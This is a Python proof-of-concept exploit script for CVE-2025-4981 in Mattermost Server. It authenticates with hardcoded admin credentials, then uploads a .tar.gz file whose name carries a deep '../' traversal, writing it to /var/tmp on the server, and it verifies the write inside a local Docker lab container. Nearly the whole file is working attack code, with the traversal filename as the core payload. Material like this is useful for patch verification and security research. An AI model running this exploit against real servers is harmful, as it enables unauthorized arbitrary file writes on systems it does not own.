#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Server — Deep Traversal + .tar.gz Extension
# CVE            : CVE-2025-4981
# Vendor         : Mattermost, Inc.
# Product        : Mattermost Server
# Affected       : ≤ 9.11.15 / ≤ 10.5.5 / ≤ 10.6.5 / ≤ 10.7.2 / ≤ 10.8.0
# Fixed          : 9.11.16 / 10.5.6 / 10.6.6 / 10.7.3 / 10.8.1
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-4981 — Vector 3: Deep Traversal with .tar.gz Extension.

This variant demonstrates:
1. Deeper path traversal (5 levels of ../) to show the traversal depth is unlimited
2. Use of .tar.gz extension (instead of .zip) to show multiple archive formats work
3. Writing to an alternate location (/var/tmp/) to prove arbitrary path control

The archive extractor recognizes multiple formats via archiver.ByExtension():
  .zip, .tar, .tar.gz, .tar.bz2, .tar.xz, .tar.lz4, .tar.sz, .tar.zst, .rar

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-4981
    - https://github.com/advisories/GHSA-qh58-9v3j-wcjc

Usage:
    python3 poc_vector3_deep_traversal.py [host] [port]
"""

import sys
import json
import time
import io
import tarfile
import http.client
import subprocess


DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8065
USERNAME = "admin"
PASSWORD = "Admin123!@#"

# Deep traversal with .tar.gz extension
# The Mattermost temp dir is typically /tmp/archiver<random>/
# 5 levels of ../ ensures we escape even if nested deeper
TRAVERSAL_FILENAME = "../../../../../var/tmp/cve-2025-4981-deep.tar.gz"
EXPECTED_PATH = "/var/tmp/cve-2025-4981-deep.tar.gz"
PROOF_MARKER = b"CVE-2025-4981 DEEP TRAVERSAL PROOF - TAR.GZ VARIANT"


def create_minimal_targz(content: bytes) -> bytes:
    """Create a minimal valid .tar.gz archive with a single file."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        info = tarfile.TarInfo(name='proof.txt')
        info.size = len(content)
        tf.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def api_request(conn, method, path, body=None, headers=None, content_type="application/json"):
    hdrs = {"Content-Type": content_type}
    if headers:
        hdrs.update(headers)
    conn.request(method, path, body=body, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read()
    try:
        json_data = json.loads(data)
    except (json.JSONDecodeError, UnicodeDecodeError):
        json_data = None
    return resp.status, dict(resp.getheaders()), json_data if json_data else data


def exploit_deep_traversal(target_host: str, target_port: int):
    """Demonstrate deep path traversal with .tar.gz extension."""
    print("[*] CVE-2025-4981 — Vector 3: Deep Traversal + .tar.gz Extension")
    print(f"[*] Target: {target_host}:{target_port}")
    print(f"[*] Traversal filename: {TRAVERSAL_FILENAME}")
    print(f"[*] Expected write path: {EXPECTED_PATH}")
    print()

    conn = http.client.HTTPConnection(target_host, target_port, timeout=30)

    # Step 1: Authenticate
    print("[1] Authenticating...")
    status, resp_headers, resp_data = api_request(
        conn, "POST", "/api/v4/users/login",
        json.dumps({"login_id": USERNAME, "password": PASSWORD})
    )
    if status != 200:
        print(f"[-] Auth failed: HTTP {status}")
        sys.exit(1)

    token = resp_headers.get("Token", "")
    if not token:
        for k, v in resp_headers.items():
            if k.lower() == "token":
                token = v
                break
    print(f"[+] Authenticated (token: {token[:12]}...)")
    auth = {"Authorization": f"Bearer {token}"}

    # Step 2: Get channel ID
    print("[2] Getting channel...")
    status, _, teams = api_request(conn, "GET", "/api/v4/users/me/teams", headers=auth)
    team_id = teams[0]["id"]
    status, _, channels = api_request(
        conn, "GET", f"/api/v4/users/me/teams/{team_id}/channels", headers=auth
    )
    channel_id = None
    for ch in channels:
        if ch.get("type") in ("O", "P"):
            channel_id = ch["id"]
            break
    if not channel_id:
        channel_id = channels[0]["id"]
    print(f"[+] Channel: {channel_id}")

    # Step 3: Clean up
    subprocess.run(["docker", "exec", "cve-2025-4981-mattermost",
                     "rm", "-f", EXPECTED_PATH], capture_output=True)

    # Step 4: Create .tar.gz payload
    print()
    print("[3] Creating .tar.gz payload...")
    targz_payload = create_minimal_targz(PROOF_MARKER)
    print(f"[+] Payload size: {len(targz_payload)} bytes")

    # Step 5: Create upload session with deep traversal
    print()
    print(f"[4] Creating upload session with deep traversal filename...")
    print(f"    Filename: {TRAVERSAL_FILENAME}")

    upload_body = json.dumps({
        "channel_id": channel_id,
        "filename": TRAVERSAL_FILENAME,
        "file_size": len(targz_payload)
    })

    status, _, session_data = api_request(
        conn, "POST", "/api/v4/uploads",
        body=upload_body, headers=auth
    )

    if status != 201:
        print(f"[-] Failed to create session: HTTP {status}")
        if isinstance(session_data, dict):
            print(f"    Error: {session_data.get('message', '')}")
        sys.exit(1)

    upload_id = session_data.get("id", "")
    print(f"[+] Upload session: {upload_id}")

    # Step 6: Upload the .tar.gz payload
    print()
    print("[5] Uploading .tar.gz payload...")
    status, _, upload_resp = api_request(
        conn, "POST", f"/api/v4/uploads/{upload_id}",
        body=targz_payload, headers=auth,
        content_type="application/octet-stream"
    )

    if status != 200:
        print(f"[-] Upload failed: HTTP {status}")
        sys.exit(1)

    file_name = upload_resp.get("name", "unknown") if isinstance(upload_resp, dict) else "unknown"
    print(f"[+] Upload completed, stored name: {file_name}")

    # Step 7: Wait and verify
    print()
    print("[6] Waiting for async content extraction...")
    for i in range(5, 0, -1):
        print(f"    {i}s...", end="\r")
        time.sleep(1)
    print("    Done.       ")

    print()
    print("[7] Verifying file at traversed path...")
    result = subprocess.run(
        ["docker", "exec", "cve-2025-4981-mattermost",
         "ls", "-la", EXPECTED_PATH],
        capture_output=True, text=True
    )

    if result.returncode == 0:
        print(f"[+] SUCCESS: File written to {EXPECTED_PATH}")
        print(f"    {result.stdout.strip()}")

        # Verify it's a valid tar.gz
        result2 = subprocess.run(
            ["docker", "exec", "cve-2025-4981-mattermost",
             "sh", "-c", f"od -c {EXPECTED_PATH} | head -3"],
            capture_output=True, text=True
        )
        if result2.returncode == 0:
            print(f"[+] File content (first bytes via od):")
            for line in result2.stdout.strip().split("\n"):
                print(f"    {line}")

        # Check MD5
        result3 = subprocess.run(
            ["docker", "exec", "cve-2025-4981-mattermost",
             "md5sum", EXPECTED_PATH],
            capture_output=True, text=True
        )
        if result3.returncode == 0:
            print(f"[+] MD5: {result3.stdout.strip()}")
    else:
        print(f"[-] FAIL: File NOT found at {EXPECTED_PATH}")
        print(f"    {result.stderr.strip()}")

    print()
    print("=" * 70)
    print("DEEP TRAVERSAL TEST COMPLETE")
    print("=" * 70)
    print()
    print(f"[*] This demonstrates:")
    print(f"    1. Path traversal depth is unlimited (5 levels of ../)")
    print(f"    2. Multiple archive extensions work (.tar.gz in addition to .zip)")
    print(f"    3. Arbitrary directory targeting (/var/tmp/ instead of /tmp/)")

    conn.close()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    try:
        exploit_deep_traversal(target, port)
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
